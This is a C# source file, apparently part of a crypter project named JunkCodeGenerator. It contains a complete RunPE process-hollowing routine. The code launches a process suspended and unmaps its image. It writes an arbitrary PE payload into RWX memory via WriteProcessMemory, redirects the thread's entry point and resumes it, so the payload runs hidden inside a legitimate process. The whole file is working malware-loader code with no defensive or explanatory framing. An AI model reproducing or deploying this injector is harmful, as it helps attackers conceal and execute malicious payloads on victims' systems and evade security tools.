using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace JunkCodeGenerator
{
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct ProcessInformation
    {
        public readonly IntPtr ProcessHandle;
        public readonly IntPtr ThreadHandle;
        private readonly uint ProcessId;
        private readonly uint ThreadId;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct StartupInformation
    {
        public uint Size;
        private readonly string Reserved1;
        private readonly string Desktop;

        private readonly string Title;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
        private readonly byte[] Misc;
        private readonly IntPtr Reserved2;
        private readonly IntPtr StdInput;
        private readonly IntPtr StdOutput;
        private readonly IntPtr StdError;
    }

    class RunPE
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(
IntPtr hProcess,
IntPtr lpBaseAddress,
[Out] byte[] lpBuffer,
int dwSize,
out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesWritten);


        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", EntryPoint = "ResumeThread")]
        public static extern int ResumeThread(IntPtr handle);

        [DllImport("kernel32.dll", EntryPoint = "CreateProcess", CharSet = CharSet.Unicode)]
        public static extern bool CreateProcess(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);

        [DllImport("kernel32.dll", EntryPoint = "GetThreadContext")]
        public static extern bool GetThreadContext(IntPtr thread, int[] context);

        [DllImport("kernel32.dll", EntryPoint = "SetThreadContext")]
        public static extern bool SetThreadContext(IntPtr thread, int[] context);

        [DllImport("ntdll.dll", EntryPoint = "NtUnmapViewOfSection")]
        public static extern int NtUnmapViewOfSection(IntPtr process, IntPtr baseAddress);


        public static bool Inject(string path, byte[] data)
        {
            IntPtr ReadWrite = IntPtr.Zero;

            StartupInformation si = new StartupInformation();
            ProcessInformation pi = new ProcessInformation();

            si.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)));
            if (!CreateProcess(path, @"\" + path + @"\", IntPtr.Zero, IntPtr.Zero, false, 4, IntPtr.Zero, null, ref si, ref pi))
                return false;

            int fileAddress = BitConverter.ToInt32(data, 60);
            int imageBase = BitConverter.ToInt32(data, fileAddress + 52);

            int[] context = new int[179];
            context[0] = 65538;

            if (!GetThreadContext(pi.ThreadHandle, context))
                return false;

            int ebx = context[41];

            byte[] BaseAddr = new byte[4];

            if (!ReadProcessMemory(pi.ProcessHandle, new IntPtr(ebx + 8), BaseAddr, 4, out ReadWrite))
                return false;

            int baseAddress = BitConverter.ToInt32(BaseAddr, 0);


            if (imageBase == baseAddress)
            {
                if (NtUnmapViewOfSection(pi.ProcessHandle, new IntPtr(baseAddress)) != 0)
                    return false;
            }

            int sizeOfImage = BitConverter.ToInt32(data, fileAddress + 80);
            int sizeOfHeaders = BitConverter.ToInt32(data, fileAddress + 84);

            bool allowOverride = false;
            int newImageBase = VirtualAllocEx(pi.ProcessHandle, new IntPtr(imageBase), new IntPtr(sizeOfImage), 12288, 64).ToInt32();

            if (newImageBase == 0)
            {
                allowOverride = true;
                newImageBase = VirtualAllocEx(pi.ProcessHandle, IntPtr.Zero, new IntPtr(sizeOfImage), 12288, 64).ToInt32();
                if (newImageBase == 0)
                    return false;
            }

            if (!WriteProcessMemory(pi.ProcessHandle, new IntPtr(newImageBase), data, sizeOfHeaders, out ReadWrite))
                return false;

            int sectionOffset = fileAddress + 248;
            short numberOfSections = BitConverter.ToInt16(data, fileAddress + 6);

            for (int I = 0; I <= numberOfSections - 1; I++)
            {
                int virtualAddress = BitConverter.ToInt32(data, sectionOffset + 12);
                int sizeOfRawData = BitConverter.ToInt32(data, sectionOffset + 16);
                int pointerToRawData = BitConverter.ToInt32(data, sectionOffset + 20);

                if (sizeOfRawData != 0)
                {
                    byte[] sectionData = new byte[sizeOfRawData];
                    Buffer.BlockCopy(data, pointerToRawData, sectionData, 0, sectionData.Length);

                    if (!WriteProcessMemory(pi.ProcessHandle, new IntPtr(newImageBase + virtualAddress), sectionData, sectionData.Length, out ReadWrite))
                        return false;
                }

                sectionOffset += 40;
            }

            byte[] pointerData = BitConverter.GetBytes(newImageBase);
            if (!WriteProcessMemory(pi.ProcessHandle, new IntPtr(ebx + 8), pointerData, 4, out ReadWrite))
                return false;

            int addressOfEntryPoint = BitConverter.ToInt32(data, fileAddress + 40);

            if (allowOverride)
                newImageBase = imageBase;
            context[44] = newImageBase + addressOfEntryPoint;

            if (!SetThreadContext(pi.ThreadHandle, context))
                return false;
            if (ResumeThread(pi.ThreadHandle) == -1)
                return false;

            return true;

        }

    }
}
